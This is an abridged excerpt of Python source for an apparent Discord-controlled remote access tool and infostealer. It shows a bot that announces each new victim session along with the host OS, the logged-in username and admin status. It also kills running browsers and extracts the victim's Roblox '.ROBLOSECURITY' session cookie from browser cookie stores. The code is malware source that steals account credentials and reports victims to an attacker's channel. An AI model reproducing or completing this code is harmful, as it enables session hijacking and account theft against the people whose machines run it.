...
bot = commands.Bot(command_prefix='!', intents=intentz)
chosen = None
uuidgen = None
helpmenu = """
...
async def close_browsers():
    ...
    for process in psutil.process_iter():
        try:
            ...
            if process.name() in browser_processes:
                process.terminate()  
...
async def on_ready():
    ...
    value1 = f"@here :white_check_mark: New session opened {uuidgen} | {platform.system()} {platform.release()} | User : {os.getlogin()}"
    if is_admin == True:
...
def cookieLogger():
    ...
    for name, get_cookies in browsers:
        try:
            cookies = get_cookies(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    return cookie.value  
        except Exception as e:
            print(f"Error retrieving {name.capitalize()} cookies: {e}")
